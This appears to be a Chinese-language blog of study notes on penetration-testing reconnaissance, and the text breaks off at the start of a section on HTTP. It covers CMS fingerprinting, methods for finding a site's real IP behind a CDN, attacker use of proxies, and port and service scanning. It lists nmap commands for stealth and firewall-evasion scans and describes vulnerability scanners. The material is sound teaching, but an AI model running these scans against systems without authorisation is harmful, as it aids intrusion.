<p>针对网站目录的扫描工具主要有：DirBuster、御剑后台扫描珍藏版、wwwscan、Spinder.py、 Sensitivefilescan、 Weakfilescan等工具。</p>
<p>DirBuster是OWASP开发的一款基于JAVA编写的、专门用于探测WEB服务器的目录 和隐藏文件</p>
<p><strong>指纹识别</strong><br>
只有正确识别出WEB容器或网站CMS，才能查找与其相关的漏洞<br>
常见的CMS有：Dedecms(织梦)、Discuz、PHPWEB、PHPCMS、PHPWind、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。<br>
识别CMS的代表工具有：御剑WEB指纹识别、WhatWeb、WebRobo、椰树、轻量WEB指纹识别等。<br>
除了这些工具，还可以利用一些在线网站来进行CMS指纹识别：<br>
http://whatweb.bugscaner.com/look/<br>
http://www.yunsee.cn/finger.html<br>
https://whatweb.net/<br>
CMS： 内容管理系统或者叫整站系统或者叫文章系统。在2004年之前，想完成网站内容管理，基本上都靠手工维护；</p>
<p><strong>查找WEB站点的真实IP</strong><br>
真正的目标WEB服务器：实际数据交互时还得找它。<br>
CDN服务器：缓存静态的数据资源<br>
1、判断目标是否使用了CDN；<br>
如果目标服务器没使用CDN，www.ip138.com<br>
通常会通过PING目标主域，观察域名的解析情况；还可以利用在线网站https://www.17ce.com<br>
2、绕过CDN寻找真实IP<br>
下边介绍一些常规的方法：<br>
内部邮箱源<br>
扫描网站测试文件<br>
分站域名<br>
国外访问：https://asm.ca.com/en/ping.php<br>
查询域名的解析记录  www.netcraft.com<br>
如果目标网站有自己的APP，可以尝试利用Fiddler或者Burp抓取APP的请求，从里边找到目标的真实IP<br>
3、验证获取到的IP<br>
最简单的验证方法是直接尝试用IP来访问此网站，看看打开的页面是不是和访问域名返回的内容一致！</p>
<p>资料参考：<br>
IP地址<br>
http://dns.aizhan.com/<br>
https://www.robtex.com<br>
https://asm.ca.com/en/ping.php<br>
http://who.is<br>
http://www.yougetsignal.com/tools/web-sites-on-web-server/<br>
http://toolbar.netcraft.com/site_report<br>
http://www.siteinfotool.com/</p>
<p>邮箱分析<br>
http://www.all-nettools.com/toolbox/email-dossier.php</p>
<p>CDN<br>
http://www.cdnplanet.com/tools/cdnfinder/</p>
<p>端口<br>
http://www.t1shopper.com/tools/port-scan/</p>
<p>综合<br>
https://www.zoomeye.org<br>
https://www.oshadan.com</p>
<p>使用Kali Linux在渗透测试中信息收集http://www.freebuf.com/articles/system/58096.html</p>
<p>利用metasploit进行信息收集<br>
http://www.freebuf.com/articles/network/33905.html</p>
<p>#2020-07-08</p>
<p>#漏洞扫描</p>
<p>分为：主动信息收集，主机信息扫描，漏洞扫描</p>
<p>主动信息收集：主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息。例如：主机爱看i发的端口，服务，站点的目录结构等等<br>
网络扫描：是一种基于internet远程监测目标网络或本地主机安全性脆弱的技术<br>
枚举：攻击者主动探查一个网络，发现其中可以被利用有价值的信息</p>
<p>主动信息收集的内容：<br>
枚举的内容：<br>
NETBIOS枚举：小型局域网协议<br>
SNMP枚举：网络管理协议<br>
Unix/Linux枚举：<br>
LDAP枚举：目录访问协议<br>
NTP枚举：网络时间协议<br>
SMTP枚举：邮件服务协议<br>
DNS枚举：域名解析协议</p>
<p>#网络扫描<br>
根据对方服务所采取的协议，在一定时间内，通过自身系统对对方协议进行特定读取，猜想验证，恶意破坏，并且将对方直接或间接的返回数据作为某指标的判断依据的一种行为。<br>
网络安全扫描通过探测端口，服务，版本和这些服务及软件安全漏洞<br>
网络安全扫描技术也是采用积极的，非破坏性的办法来检验系统是否有可能被攻击奔溃<br>
利用一系列的脚本模拟对系统进行攻击的行为，并且对结果进行分析<br>
这种技术通常被用来进行攻击实验和安全审计<br>
网络安全扫描技术与防火墙，安全监控系统互相配合就能够为网络提供很高的安全性</p>
<p>特点：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625740619180.png" alt="" loading="lazy"><br>
网络扫描获取的信息<br>
发现存活主句，ip地址，以及存活主机开放的端口<br>
发现主机操作系统类型和系统结构<br>
发现主机开启的服务类型<br>
发现主机存在的漏洞</p>
<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1625741473738.png" alt="" loading="lazy"></figure>
<p>预备代理（扫描之间要使用代理）<br>
直接与目标系统交互通信<br>
无法避免留下访问的痕迹<br>
所以要做好被封杀的准备</p>
<h1 id="代理服务器">代理服务器</h1>
<p>功能是代理网络用户取得网络信息<br>
形象的说：他是网络信息的中转站，代理服务器就好像一个大的cache这样救恩那个显著提高浏览速度和效率，更重要的是：Proxy Server（代理服务器）是internet链路级网关所提供的一种重要的安全功能<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625742790643.png" alt="" loading="lazy"></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1625743180435.png" alt="" loading="lazy"><br>
1.突破自身IP访问限制，访问国外站点，教育网、google等<br>
2.访问单位或团体内部资源，使用教育网内地址段免费代理服务器，就可以用于对教育网开放的各类FTP下载上传，以及各类资料查询共享<br>
3.突破中国电信的IP封锁：中国电信用户有很多网站是被限制访问的，这种限制是人为的，不同Serve对地址的封锁是不同的。<br>
4.提高访问速度：通常代理服务器都设置一个较大的硬盘缓冲区，当有外界的信息通过时，同时也将其保存到缓冲区中，当其他用户再访问相同的信息时， 则直接由缓冲区中取出信息，传给用户，以提高访问速度。<br>
5.隐藏真实IP：上网者也可以通过这种方法隐藏自己的IP，免受攻击。</p>
<p>几种常见的代理</p>
<p>Http代理：<br>
www对于每一个上网的人都再熟悉不过了，www连接请求就是采用的http协议，所以我们在浏览网页，下载数据（也可采用ftp协议）时就是用http代理，他用长绑定在代理服务器的80，3128，8080端口上</p>
<p>Socks代理：<br>
采用socks协议的代理服务器jiushisocks服务器，是一种通用的代理服务器<br>
使用socks需要了解：1.socks服务器的IP地址 2.socks服务所在的端口 3.这个socks服务是否需要用户认证？如果需要，您要向您的网络管理员申请一个用户和命令<br>
应用：各种网游加速器</p>
<p>Vpn代理<br>
公用网络上建立专用网络的技术。整个vpn网络的任意两个结点架构在公用网络服务商isp所提供的网络平台之上的逻辑网络，用户的数据是通过公共网络中建立的逻辑隧道即点导电的虚拟专线进行传输的，通过相应的加密和认证技术来保证用户内部网络书据在公网上安全传输，从而真正实现网络数据的专有性。</p>
<p>备注：HTTP代理<br>
www对于每一个上网的人都再熟悉不过了，www连接请求就是采用的http协议，所以我们在浏览网页，下载数据（也可采用ftp协议）时就是用http代理。它通常绑定在代理服务器的80、3128、8080等端口上。<br>
socks代理<br>
采用socks协议的代理服务器就是SOCKS服务器，是一种通用的代理服务器。Socks是个电路级的底层网关，是DavidKoblas在1990年开发的，此后就一直作为Internet RFC标准的开放标准。Socks 不要求应用程序遵循特定的操作系统平台，Socks 代理与应用层代理、HTTP层代理不同，Socks 代理只是简单地传递数据包，而不必关心是何种应用协议（比如FTP、HTTP和NNTP请求）。所以，Socks代理比其他应用层代理要快得多。它通常绑定在代理服务器的1080端口上。如果您在企业网或校园网上，需要透过防火墙或通过代理服务器访问 Internet就可能需要使用SOCKS。一般情况下，对于拨号上网用户都不需要使用它。注意，浏览网页时常用的代理服务器通常是专门的http代理，它和SOCKS是不同的。因此，您能浏览网页不等于 您一定可以通过SOCKS访问Internet。常用的防火墙，或代理软件都支持SOCKS，但需要其管理员打开这一功能。如果您不确信您是否需要SOCKS或是否有SOCKS可用，请与您的网络管理员联系。使用socks，需要了解一下内容：<br>
① SOCKS服务器的IP地址<br>
② SOCKS服务所在的端口<br>
③ 这个SOCKS服务是否需要用户认证？如果需要，您要向您的网络管理员申请一个用户和口令<br>
知道了上述信息，您就可以把这些信息填入“网络配置”中，或者在第一次登记时填入，您就可以使用socks代理了。[1] <br>
在实际应用中SOCKS代理可以用作为：电子邮件、新闻组软件、网络传呼ICQ、网络聊天MIRC和使用代理服务器上联众打游戏等等各种游戏应用软件当中。[1] <br>
VPN代理<br>
指在共用网络上建立专用网络的技术。之所以称为虚拟网主要是因为整个VPN网络的任意两个结点之间的连接并没有传统专网建设所需的点到点的物理链路，而是架构在公用网络服务商ISP所提供的网络平台之上的逻辑网络。用户的数据是通过ISP在公共网络（Internet）中建立的逻辑隧道（Tunnel），即点到点的虚拟专线进行传输的。通过相应的加密和认证技术来保证用户内部网络数据在公网上安全传输，从而真正实现网络数据的专有性。</p>
<p>攻击者可以通过使用代理服务器可以？<br>
隐藏源地址，所以攻击可以在无任何法律论据的情况下入侵；<br>
通过冒充一个代理的源地址来掩盖实际的攻击地址；<br>
远程访问内网和其他通常禁止访问的网页资源；<br>
拦截所有攻击者发送的请求并且将其他们转换为第三个目标，因此受害者这将只能识别代理服务器的地址；<br>
攻击者将多个代理服务器连接起来以避免被探测到</p>
<h1 id="主机信息扫描">主机信息扫描</h1>
<p>判断存活主机<br>
ping扫描值得是向主机发送ICMP ECHO请求报文。如果主机是活动的，他将返回一个ICMP ECHO应答<br>
（PING：是DOS命令，一般用于检测网络通与不通，也叫时延，其值越大，速度越慢。PIING，因特网包探索器，用于测试网络连接量的程序，Ping发送一个ICMP(Internet Contron Messages Protocol);因特网信报控制协议）回声请求消息给目的地并且报告是否收到所希望的ICMP回声应答<br>
它是用来检查网络是否通畅或者网络连接速度的命令。作为一个生活在网络上的管理员或者黑客来说，ping命令是一个必须掌握的DOS命令，她所利用的原理是这样的；利用网络上机器IP地址的唯一性，给目标IP地址发送一个数据包，再要求对方返回一个同样大小的数据包来确定两台网络机器是否连接相通，时延是多少</p>
<p>ping说明<br>
指定包个数<br>
Ping -n 2 200.200.0.20</p>
<p>不间断发送ping包<br>
Ping -t 200.200.0.20</p>
<p>指定ping包字节大小<br>
Ping -l 1000 200.200.0.20</p>
<figure data-type="image" tabindex="3"><img src="https://jinqipiaopiao.github.io//post-images/1625791128315.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://jinqipiaopiao.github.io//post-images/1625791289444.png" alt="" loading="lazy"></figure>
<p>ICMP的回送请求和应答报文通常是用来检查网路连通性，对于大多数系统而言，发送ICMP echo request 报文的命令是ping，由于ip数据包的最大长度为65535字节，而icmp报文位于数据报头之后，并与IP数据包封装在一起，因此icmp数据包最大尺寸不超过65515字节利用这一规定，可以向主句发动ping of death 攻击。 ping of death 攻击 是通过在最后分段中，改变其正确的偏移量和段长度的组合，使系统再接收到全部分段并重组报文时总的长度超过了65535字节，导致内粗哪一出，这时主机就会出现内存分配错误而导致TCP/IP堆栈奔溃导致死机</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1625791941578.png" alt="" loading="lazy"><br>
PING扫射<br>
同时扫描大量的ip地址段，以发现某个ip地址是否绑定活跃主机的扫描</p>
<p>批量主机存活发现原理<br>
客户端对二秘阁IP地址做出ICMP echo request 请求<br>
存活的主机对请求做出ICMP echo reply 回应<br>
不存活主机不做任何回应<br>
服务端完成统计<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625791948248.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625791952113.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625791955705.png" alt="" loading="lazy"></p>
<p>端口扫描---端口和服务<br>
什么是服务：<br>
“服务”是指某主机按预先定义的协议和一些国际标准，行业标准，向其他主机提供某种数据的支持，并且称服务提供者为“服务器”（Server），称服务请求者为“客户端”（Client）</p>
<p><strong>端口和服务的关系</strong><br>
一台主机可安装多个服务，这些服务可以是相同的服务，也可以是不同的服务，为了区分这些服务，引入端口（“port”）这个概念，即每一个服务对应于一个或者多个端口，端口具有独占性，一旦有服务占用了某个端口，则通常情况下，另外的服务不能再占用这个端口</p>
<p>端口：是传输层协议为了识别统一主机上不同应用程序进程而引入的一个概念</p>
<p><strong>端口的管理和分配</strong><br>
端口有应用程序申请，操作系统统一管理和分配<br>
一个应用程序会占用一个或者多个端口</p>
<p>端口分类：<br>
公认端口：<br>
0-1023的端口是公认的，知名的</p>
<p>0-255之间的端口由英特网名称与数字地址分配机构（ICANN）</p>
<p>注册端口：<br>
注册端口主要用于服务器对外提供服务<br>
端口范围：1024-49151</p>
<p>动态/私有端口<br>
用于分配给用户编写的客户端应用程序<br>
端口范围：49152-65535</p>
<p><strong>常见知名端口：</strong><br>
UDP端口：<br>
161-SNMP，53-DNS，69-TFTP，111-RPC<br>
TCP端口：<br>
21-FTP，23-Telnet，25-SMTP，80-HTTP</p>
<p>端口		应用层协议		说明<br>
53		DNS			域名服务器<br>
69		TFTP			简单文件传输协议<br>
111		RPC			远程过程调用<br>
161     SNMP			简单网络管理协议</p>
<p>端口		应用层协议		说明<br>
20		FTP			文件传输协议（数据连接）<br>
21		FTP			文件传输协议（控制连接）<br>
23		Telnet			远程登录协议<br>
25		SMTP			简单文件传输协议<br>
80		HTTP			超文本传输协议<br>
110		POP3			邮局协议</p>
<p><strong>端口扫描的原理</strong><br>
原理：<br>
端口扫描是向目标主机的TCP或UDP端口发送探测数据包，随后记录目标主机的响应。通过分析目标主机的响应来判断服务端口是打开还是关闭，据此推测目标主机端口提供的服务或信息</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1625799863444.png" alt="" loading="lazy"><br>
Tcp客户端<br>
对端口建立连接，记录远端服务器应答，查询记录获取目标服务器所安装的服务名称<br>
Udp客户端<br>
对端口建立连接，记录远端服务器应答，查询记录获取目标服务器所安装的服务名称</p>
<p><strong>端口扫描-nmap</strong><br>
定义：是由Gordon Loyon设计，用来探测计算机网络上的主机和服务的一种安全扫描器，为了绘制网络拓扑图，nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析，nmap是一款枚举和测试网络的强大工具<br>
Nmap是目前业界最为知名、最为强大的端口扫描器。Nmap在安全领域内非常流行，像渗透工具Metasploit、漏洞扫描工具openVAS等工具都内置了Nmap，而漏洞扫描工具Nessus也支持导入Nmap扫描结果。<br>
Nmap是主要用于基本的信息的搜集，包括主机活动状态、主机端口开放状况、应用服务及版本、操作系统与设备类型等等。</p>
<p>作用：<br>
主机探测：探测网络上的主机<br>
端口探测：探测目标主机所开放的端口<br>
版本检测：探测目标主机的网络服务名称以及版本号<br>
系统监测：探测目标主机的操作系统以及网络设备的硬件特性</p>
<p>主机探测：探测网络上的主机，例如列出响应TCP和ICMP请求、icmp请求、开放特别端口的主机。<br>
端口扫描：探测目标主机所开放的端口。<br>
版本检测：探测目标主机的网络服务，判断其服务名称及版本号。<br>
系统检测：探测目标主机的操作系统及网络设备的硬件特性。<br>
支持探测脚本的编写：使用Nmap的脚本引擎（NSE）和Lua编程语言。</p>
<p>典型作用：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625800700470.png" alt="" loading="lazy"><br>
1、通过对设备或者防火墙的探测来审计它的安全性。<br>
2、探测目标主机所开放的端口。<br>
3、网络存储，网络映射，维护和资产管理。（这个有待深入）<br>
4、通过识别新的服务器审计网络的安全性。<br>
5、探测网络上的主机。</p>
<p>我们不能简单的认为开启21端口号就认为开启了FTP服务，我们完全可以将web服务开启在21端口 ，我们找到了存活主机，找到了开放的端口，接下来我们需要下一个扫描<br>
通过服务类型探查可以：<br>
探查活跃主机的系统及开放网络服务的类型<br>
目标主机上运行着何种类型什么版本的操作系统<br>
各个开放端口上监听的是哪些网络服务阶段，在开放端口后面是什么服务。</p>
<p>服务扫描的内容：<br>
标识符抓取<br>
操作系统识别<br>
服务类型识别<br>
绘制网络拓扑</p>
<p><strong>标识符提取</strong><br>
Banner提取是一种活动，用于确定正在运行远程计算机上的服务信息。系统是管理人员和黑客也渗透测试使用经常使用，恶意黑客通过banner获取技术，识别目标主机的操作系统，进一步探测操作系统几倍的了偶东从而可以从这一级别进行渗透测试<br>
操作系统和本系统应用一般是成套出现的，例如LAMP或者LNMP。操作系统的版本也有助于准确定位服务程序或者软件的版本，比如windows server 2003 搭载的IIS为6.0，windows server 2008 R2 搭载的是IIS7.5。</p>
<p>banner中的信息<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625801930768.png" alt="" loading="lazy"></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1625802167260.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625802194294.png" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="5"><img src="https://jinqipiaopiao.github.io//post-images/1625802341325.png" alt="" loading="lazy"></figure>
<p>为什么要识别操作系统？<br>
许多漏洞是系统相关的，而且往往与相应的版本对应；<br>
从操作系统或者应用系统的具体实现中发掘出来的攻击手段都需要辨识系统；<br>
操作系统的信息还可以与其他信息结合起来，比如漏洞库，社工库</p>
<p><strong>操作系统识别的技术和原理</strong><br>
原理：<br>
操作系统扫描大部分都是基于TCP/IP协议栈的指纹检测技术的。</p>
<p>做法：<br>
寻找不同操作系统之间在处理网络数据包上的差异，并且把足够多的差异组合起来，以便精确地识别出一个系统的OS版本。</p>
<p>不同操作系统类型和版本的差异性体现在？<br>
协议栈实现差异－协议栈指纹鉴别<br>
开放端口的差异－端口扫描<br>
应用服务的差异－标识符提取</p>
<p>扫描分类：<br>
被动监听<br>
主动探测</p>
<figure data-type="image" tabindex="6"><img src="https://jinqipiaopiao.github.io//post-images/1625803603524.png" alt="" loading="lazy"></figure>
<p><img src="https://jinqipiaopiao.github.io//post-images/1625820444778.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625820451630.png" alt="" loading="lazy"></p>
<p>TTL（域名解析在DNS服务器中存留时间）是 Time To Live的缩写，该字段指定IP包被路由器丢弃之前允许通过的最大网段数量。TTL是IPv4报头的一个8 bit字段。<br>
注意：TTL与DNS TTL有区别。二者都是生存时间，前者指ICMP包的转发次数（跳数），后者指域名解析信息在DNS中的存在时间。</p>
<figure data-type="image" tabindex="7"><img src="https://jinqipiaopiao.github.io//post-images/1625823274069.png" alt="" loading="lazy"></figure>
<p>服务类型探测：<br>
网络服务类型探查<br>
-确定目标网络中开放端口上绑定的网络应用服务类型和版本<br>
-了解目标系统更丰富信息，可支持进一步的操作系统辨识和漏洞识别</p>
<p>网络服务主动探测<br>
-网络服务旗标抓取和探测：nmap   -sV</p>
<p>Nmap常用参数：<br>
-v详细模式<br>
-p指定端口范围<br>
-O操作系统识别<br>
-A全面检测</p>
<p>-sV探测端口服务器版本<br>
-sA ACK扫描 探测防火墙<br>
-sP Ping扫描 快速扫描<br>
-sS TCP SYN扫描 半开放扫描 比较隐蔽<br>
-sT TCP扫描 完全建立连接 会在目标主机留下日志<br>
-sU UDP扫描 制定端口开放</p>
<p>1.半开放扫描1到65535端口（nmap –sS –p 1-65535 –v ip/url）<br>
2.扫描C段存活主机（nmap –sP ip/url）<br>
3.指定端口扫描（nmap –p 80,3389 ip/url）<br>
4.扫描主机操作系统（nmap –O ip/url）<br>
5.主机详细扫描（nmap –v -A ip/url）<br>
6.穿透防火墙扫描<br>
（nmap –Pn –A ip/url）<br>
（nmap –sS –T4 ip/url）<br>
（nmap –sF –T4 ip/url）<br>
（nmap –sA –T4 ip/url）</p>
<p>漏洞扫描</p>
<p>漏洞：安全脆弱性<br>
一般认为，漏洞是指硬件软件或策略上存在的安全缺陷，从而使得攻击者能够在未授权的情况下访问，控制系统</p>
<p>漏洞扫描：<br>
检查系统是否存在已公布安全漏洞，从而易于遭受网络攻击的技术</p>
<p>漏洞扫描是指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用的漏洞的一种安全检测（渗透攻击）行为。<br>
漏洞扫描技术是一类重要的网络安全技术，他和防火墙，入侵检测系统互相配合，能够有效提高网络的安全性。通过对网络的扫描，网络管理员能了解网络的安全设置和运行的应用服务，及时发现安全漏洞，客观评估网络风险等级。网络管理员能根据扫描的结果更正网络安全漏洞和系统中的错误设置，在黑客攻击前进行防范。如果说防火墙和网络监视系统是被动的防御手段，那么安全扫描就是一种主动的防范措施，能有效避免黑客攻击行为，做到防患于未然</p>
<p>漏洞扫描可以发现：<br>
网络拓扑和操作系统的脆弱点<br>
开放的端口和进行的服务<br>
应用程序和服务器配置错误<br>
应用程序和服务脆弱点<br>
网络拓扑和操作系统脆弱点</p>
<h1 id="基本原理">基本原理：</h1>
<p>1.漏洞库匹配法<br>
漏洞扫描，收集信息-&gt;漏洞库匹配-&gt;漏洞发现<br>
如：<br>
CGI漏洞，FTP漏洞，SSH漏洞，HTTP漏洞<br>
2.模拟攻击法<br>
目录遍历漏洞探测，跨站漏洞，FTP弱口令探测等</p>
<p>基于网络的漏洞扫描，就是通过远程检测目标主机TCP/IP不同端口的服务，记录目标主机给予的回答。用这种方法来了解目标主机的各种信息，获得相关信息后，与网络漏洞扫描系统提供的漏洞库进行匹配，如果满足匹配条则视为漏洞存在<br>
话有一种方法就是通过模拟黑客的进攻手法，对目标主机系统进行攻击性的安全漏洞扫描，如测试弱口令等，如果模拟攻击成功则视为漏洞存在</p>
<h1 id="漏洞库">漏洞库</h1>
<p>CVSS（Common Vulnerability Scoring System）<br>
CVSS是安全内容自动化协议（SCAP）的一部分<br>
通常CVSS与CVE一同由美国国家漏洞库（NVD）发布并保持数据的更新<br>
分值范围：0-10<br>
不同机构按CVSS分值定义威胁的中，高，低威胁级别<br>
CVSS体现弱点的风险，威胁级别（severity）表示弱点风险对企业的影响程度<br>
CVSS分值是工业标准，但威胁级别不是</p>
<p>通用漏洞评分系统（CVSS）诞生于2007年，是用于评估系统安全漏洞严重程度的一个行业公开标准。CVSS现在已经进入第二个版本，第三版正在开发中。它的主要目的是帮助人们建立衡量漏洞严重程度的标准，使得人们可以比较漏洞的严重程度，从而确定处理它们的优先级。CVSS得分基于一系列维度上的测量结果，这些测量维度被称为量度（Metrics）。漏洞的最终得分最大为10，最小为0。得分7<sub>10的漏洞通常被认为比较严重，得分在4</sub>6.9之间的是中级漏洞，0~3.9的则是低级漏洞。</p>
<p><strong>其他概念</strong><br>
OVAL（Open Vulnerability and Assessment Language）<br>
• 描述漏洞检测方法的机器可识别语言。<br>
• 详细的描述漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作。<br>
• OVAL使用XML语言描述，包含了严密的语法逻辑。</p>
<p>CCE<br>
• 描述软件配置缺陷的一种标准化格式。<br>
• 在信息安全风险评估中，配置缺陷的检测是一项重要内容，使用CCE可以让配置缺陷以标准的方式展现出来，便于配置缺陷评估的可量化操作。</p>
<p>CPE（Common Product Enumeration）<br>
• 信息技术产品、系统、软件包的结构化命名规范，分类命名。</p>
<p>CWE（Common Weakness Enumeration）<br>
• 常见漏洞类型的字典，描述不同类型漏洞的特征（访问控制、信息泄露、拒绝服务）</p>
<p><strong>CVE漏洞库</strong><br>
——为了规范漏洞的描述，MITER公司建立了一个通用的漏洞列表（Common Vulnerabilities &amp; Exposures，简称CVE）。<br>
已公开的信息安全漏洞字典，统一的漏洞编号标准<br>
MITRE公司负责维护（非盈利机构）<br>
扫描器的大部分扫描项都对应一个CVE编号<br>
实现不同厂商之间信息交换的统一标准<br>
网址：http://cve.mitre.org/</p>
<p><strong>其他漏洞库</strong></p>
<p>国外漏洞库<br>
BugTraq漏洞库（http://www.securityfocus.com/bid）<br>
ICAT漏洞库（http://icat.nist.gov/icat.cfm）<br>
X-Force漏洞库 （http://xforce.iss.net）<br>
CERT/CC漏洞信息数据库（ http://www.cert.org ）</p>
<p>国内漏洞库<br>
国家计算机网络入侵防范中心（http://www.nipc.org.cn）<br>
绿盟科技（http://www.nsfocus.com）<br>
安全焦点（http://www.xfocus.net）<br>
中国信息安全论坛（http://www.chinafirst.org.cn）<br>
安络科技（http://www.cnns.net）<br>
中国计算机网络应急处理协调中心（http://www.cert.org.cn）</p>
<p>BugTraq漏洞数据库<br>
是SecurityFocus公司维护的一个关于计算机安全漏洞详细信息讨论的邮件列表，内容包括：<br>
漏洞的描述；<br>
漏洞的渗透方法——漏洞的利用；<br>
漏洞的修补方法等<br>
SecurityFocus公司还创建了一个与CVE相兼容的数据库。通过互联网，该数据库向用户提供5种漏洞检索方式：<br>
软件供应商；标题；关键字；BugTraq IDCVE ID<br>
ICAT漏洞库<br>
——美国标准技术研究所维护的一个与CVE相兼容的一个漏洞数据库；<br>
——可以通过Web网页访问，可以以Microsoft Access数据库的格式下载到本地。<br>
X-Force漏洞库<br>
ISS公司维护的一个漏洞数据库 ，每条漏洞记录包括：<br>
漏洞描述；受影响的平台；补救措施；风险等级；影响结果；报告时间；参考链接等。<br>
CERT/CC漏洞信息数据库<br>
——美国计算机安全应急响应组（Computer Emergency Response Team，CERT）与 CC （Common Criteria standard，通用评估准则 ）发布的数据库 ，每条漏洞记录包括：<br>
漏洞描述、影响；<br>
解决方案；<br>
受影响的系统；<br>
参考链接等。</p>
<figure data-type="image" tabindex="8"><img src="https://jinqipiaopiao.github.io//post-images/1625831867784.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://jinqipiaopiao.github.io//post-images/1625835074661.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://jinqipiaopiao.github.io//post-images/1625835221537.png" alt="" loading="lazy"></figure>
<p>WVS拥有大量的自动化特性和手动工具，它的工作方式：<br>
1.它将会扫描整个网站，它通过跟踪站点上的所有链接和robots.txt（如果有的话）而实现扫描。然后WVS就会映射出站点的结构并显示每个文件的细节信息。<br>
2.在上述的发现阶段或扫描过程之后，WVS就会自动地对所发现的每一个页面发动一系列的漏洞攻击，这实质上是模拟一个黑客的攻击过程。WVS分析每一个页面中可以输入数据的地方，进而尝试所有的输入组合。这是一个自动扫描阶段。<br>
3.在它发现漏洞之后，WVS就会在“Alerts Node（警告节点）”中报告这些漏洞。每一个警告都包含着漏洞信息和如何修复漏洞的建议。<br>
4.在一次扫描完成之后，它会将结果保存为文件以备日后分析以及与以前的扫描相比较。使用报告工具，就可以创建一个专业的报告来总结这次扫描。<br>
WVS自动地检查下面的漏洞和内容：<br>
·版本检查，包括易受攻击的Web服务器，易受攻击的Web服务器技术<br>
·CGI测试，包括检查Web服务器的问题，主要是决定在服务器上是否启用了危险的HTTP方法，例如PUT，TRACE，DELETE等等。<br>
·参数操纵：主要包括跨站脚本攻击（XSS）、SQL注入攻击、代码执行、目录遍历攻击、文件入侵、脚本源代码泄漏、CRLF注入、PHP代码注入、XPath注入、LDAP注入、Cookie操纵、URL重定向、应用程序错误消息等。<br>
·多请求参数操纵：主要是Blind SQL / XPath注入攻击<br>
·文件检查：检查备份文件或目录，查找常见的文件（如日志文件、应用程序踪迹等），以及URL中的跨站脚本攻击，还要检查脚本错误等。<br>
·目录检查，主要查看常见的文件，发现敏感的文件和目录，发现路径中的跨站脚本攻击等。<br>
·Web应用程序：检查特定Web应用程序的已知漏洞的大型数据库，例如论坛、Web入口、CMS系统、电子商务应用程序和PHP库等。<br>
·文本搜索：目录列表、源代码揭示、检查电子邮件地址、微软Office中可能的敏感信息、错误消息等。<br>
·GHDB Google攻击数据库：可以检查数据库中1400多条GHDB搜索项目。<br>
·Web服务：主要是参数处理，其中包括SQL注入/Blind SQL注入（即盲注攻击）、代码执行、XPath注入、应用程序错误消息等。<br>
使用该软件所提供的手动工具，还可以执行其它的漏洞测试，包括输入合法检查、验证攻击、缓冲区溢出等。</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1625835259133.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625835280331.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625835303830.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625835334869.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625835372987.png" alt="" loading="lazy"></p>
<p>AppScan扫描的原则<br>
全面阶段包含两个阶段：探索和测试<br>
探索阶段：<br>
在第一个阶段里，appscan会通过模仿成web用户点击链接并且填写表单字段来探索站点（web应用程序h或web server）这就是探索阶段。探索阶段可以遍历每个url路径，并且分析后创建测试点<br>
测试阶段：<br>
测试期间，appscan会发送他在探索阶段创建的成千上万个定制的测试请求，通过你定制好的测试策略分析每个测试的响应，最后根据规则是被应用程序中的安全问题，并排列这些安全问题的风险级别。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625838109553.png" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="11"><img src="https://jinqipiaopiao.github.io//post-images/1625838172571.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://jinqipiaopiao.github.io//post-images/1625838201810.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="13"><img src="https://jinqipiaopiao.github.io//post-images/1625838266154.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://jinqipiaopiao.github.io//post-images/1625838272486.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="15"><img src="https://jinqipiaopiao.github.io//post-images/1625838325110.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="16"><img src="https://jinqipiaopiao.github.io//post-images/1625838356236.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="17"><img src="https://jinqipiaopiao.github.io//post-images/1625838408835.png" alt="" loading="lazy"></figure>
<h1 id="其他漏洞扫描器">其他漏洞扫描器</h1>
<p>商业：</p>
<p>Netsparker<br>
WebInspect</p>
<p>开源：</p>
<p>W3af<br>
Owasp Zap</p>
<h1 id="2021-07-13">2021-07-13</h1>
<p>#HTTP协议解析</p>
<p>HTTP（HyperText Transfer Protocol）即超文本传输协议，是一种详细规定了浏览器和万维网服务器之间互相通信的规则，它是万维网交换信息的基础，它允许将HTML（超文本标记语言）文档从Web服务器传送到Web浏览器。<br>
